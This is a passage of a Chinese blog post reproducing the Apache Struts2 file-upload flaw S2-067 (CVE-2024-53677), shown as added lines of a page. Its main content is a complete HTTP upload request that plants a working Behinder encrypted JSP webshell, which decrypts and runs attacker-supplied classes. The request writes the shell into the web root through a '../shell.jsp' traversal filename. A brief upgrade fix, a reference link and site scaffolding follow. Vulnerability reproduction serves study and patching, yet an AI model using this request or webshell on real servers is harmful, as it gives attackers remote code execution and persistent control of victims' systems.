+<p><img src="1734625785344-83c8c8a1-3808-46b2-af0e-a6f5e453d5c0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>可以被解析</p>
+<p><img src="1734625866932-16eb70cf-40f5-46c0-9a2e-83dd09d5cb92.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>冰蝎马上传到web根目录。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs powershell">POST /untitled_war/uploads.action HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">0.116</span>:<span class="hljs-number">8080</span><br>User<span class="hljs-literal">-Agent</span>: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; <span class="hljs-built_in">rv</span>:<span class="hljs-number">132.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">132.0</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,*/*;q=<span class="hljs-number">0.8</span><br>Accept<span class="hljs-literal">-Language</span>: zh<span class="hljs-literal">-CN</span>,zh;q=<span class="hljs-number">0.8</span>,zh<span class="hljs-literal">-TW</span>;q=<span class="hljs-number">0.7</span>,zh<span class="hljs-literal">-HK</span>;q=<span class="hljs-number">0.5</span>,en<span class="hljs-literal">-US</span>;q=<span class="hljs-number">0.3</span>,en;q=<span class="hljs-number">0.2</span><br>Accept<span class="hljs-literal">-Encoding</span>: gzip, deflate, br<br>Referer: http://<span class="hljs-number">172.16</span>.<span class="hljs-number">65.98</span>:<span class="hljs-number">8080</span>/untitled_war/<br>Content<span class="hljs-literal">-Type</span>: multipart/form<span class="hljs-literal">-data</span>; boundary=<span class="hljs-literal">---------------------------376058448320617365003265882680</span><br>Content<span class="hljs-literal">-Length</span>: <span class="hljs-number">3632</span><br>Origin: http://<span class="hljs-number">192.168</span>.<span class="hljs-number">0.116</span>:<span class="hljs-number">8080</span><br>Connection: close<br>Cookie: JSESSIONID=<span class="hljs-number">953590</span>EEDDD585B3CFE1A15E18C518C9<br>Upgrade<span class="hljs-literal">-Insecure-Requests</span>: <span class="hljs-number">1</span><br>Priority: u=<span class="hljs-number">0</span>, i<br><br><span class="hljs-literal">-----------------------------376058448320617365003265882680</span><br>Content<span class="hljs-literal">-Disposition</span>: form<span class="hljs-literal">-data</span>; name=<span class="hljs-string">&quot;Upload&quot;</span>; filename=<span class="hljs-string">&quot;1.txt&quot;</span><br>Content<span class="hljs-literal">-Type</span>: application/octet<span class="hljs-literal">-stream</span><br><br>&lt;%@page import=<span class="hljs-string">&quot;java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*&quot;</span> %&gt;<br>&lt;%!<br>private byte<span class="hljs-function">[] <span class="hljs-title">Decrypt</span></span>(byte[] <span class="hljs-keyword">data</span>) throws Exception<br>&#123;<br>     byte[] decodebs;<br>        <span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">baseCls</span> ;                                                                                                    </span><br><span class="hljs-class">                <span class="hljs-title">try</span></span>&#123;                                                                                                                                                                                               <br>                    baseCls=Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);                                                                                                                                                     <br>                    Object Decoder=baseCls.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>, null).invoke(baseCls, null);                                                                                                                    <br>                    decodebs=(byte[]) Decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, new <span class="hljs-class"><span class="hljs-keyword">Class</span>[]</span>&#123;byte[].class&#125;).invoke(Decoder, new Object[]&#123;<span class="hljs-keyword">data</span>&#125;);                                                                       <br>                &#125;                                                                                                                                                                                                  <br>                <span class="hljs-keyword">catch</span> (Throwable e)                                                                                                                                                                                <br>                &#123;                                                                                                                                                                                                  <br>                    baseCls = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>                    Object Decoder=baseCls.newInstance();<br>                    decodebs=(byte[]) Decoder.getClass().getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>,new <span class="hljs-class"><span class="hljs-keyword">Class</span>[]</span>&#123;String.class&#125;).invoke(Decoder, new Object[]&#123;new String(<span class="hljs-keyword">data</span>)&#125;);<br><br>                &#125;<br>    String key=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>;<br>        <span class="hljs-keyword">for</span> (int i = <span class="hljs-number">0</span>; i &lt; decodebs.length; i++) &#123;<br>                decodebs[<span class="hljs-type">i</span>] = (byte) ((decodebs[<span class="hljs-type">i</span>]) ^ (key.getBytes()[<span class="hljs-type">i</span> + <span class="hljs-number">1</span> &amp; <span class="hljs-number">15</span>]));<br>        &#125;<br>        <span class="hljs-keyword">return</span> decodebs;<br>&#125;<br>%&gt;<br>&lt;%!<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">U</span> <span class="hljs-title">extends</span> <span class="hljs-title">ClassLoader</span></span>&#123;U(ClassLoader c)&#123;super(c);&#125;public <span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">g</span>(<span class="hljs-title">byte</span> []<span class="hljs-title">b</span>)</span>&#123;<span class="hljs-keyword">return</span><br>        super.defineClass(b,<span class="hljs-number">0</span>,b.length);&#125;&#125;%&gt;&lt;%<span class="hljs-keyword">if</span> (request.getMethod().equals(<span class="hljs-string">&quot;POST&quot;</span>))&#123;<br>            ByteArrayOutputStream bos = new ByteArrayOutputStream();<br>            byte[] buf = new byte[<span class="hljs-number">512</span>];<br>            int length=request.getInputStream().read(buf);<br>            <span class="hljs-keyword">while</span> (length&gt;<span class="hljs-number">0</span>)<br>            &#123;<br>                byte[] <span class="hljs-keyword">data</span>= Arrays.copyOfRange(buf,<span class="hljs-number">0</span>,length);<br>                bos.write(<span class="hljs-keyword">data</span>);<br>                length=request.getInputStream().read(buf);<br>            &#125;<br>            /* 取消如下代码的注释，可避免response.getOutputstream报错信息，增加某些深度定制的Java web系统的兼容性<br>            out.clear();<br>            out=pageContext.pushBody();<br>            */<br>            out.clear();<br>            out=pageContext.pushBody();<br>        new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);&#125;<br>%&gt;<br><br><br><span class="hljs-literal">-----------------------------376058448320617365003265882680</span><br>Content<span class="hljs-literal">-Disposition</span>: form<span class="hljs-literal">-data</span>; name=<span class="hljs-string">&quot;uploadFileName[0]&quot;</span>;<br><br>../shell.jsp<br><span class="hljs-literal">-----------------------------376058448320617365003265882680--</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="1734626442075-98b5ae5c-2c27-42c7-bfe1-9755b06b3b37.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="1734626514638-99d8f218-0c9a-4486-a71a-fdae77dc92e5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="1734626551793-b4619cdf-af30-4917-a523-8f394f88b800.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="0x06-修复方式"><a href="#0x06-修复方式" class="headerlink" title="0x06 修复方式"></a>0x06 修复方式</h2><p>将框架升级到官方发布的最新版本，修复漏洞。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/">https://y4tacker.github.io/2024/12/16/year/2024/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87-CVE-2024-53677-S2-067/</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="category-chain-item">漏洞复现</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Apache/" class="print-no-link">#Apache</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Apache Struts2文件上传逻辑漏洞S2-067</div>
+      <div>http://example.com/2025/03/22/Apache-Struts2文件上传逻辑漏洞S2-067/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>hexi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月22日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/03/22/frida%E6%8A%93%E5%8C%85%E7%AC%94%E8%AE%B0/" title="frida抓包笔记">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">frida抓包笔记</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/22/jsp%E5%85%8D%E6%9D%80%E6%8E%A2%E8%AE%A8/" title="jsp免杀探讨">
+                        <span class="hidden-mobile">jsp免杀探讨</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
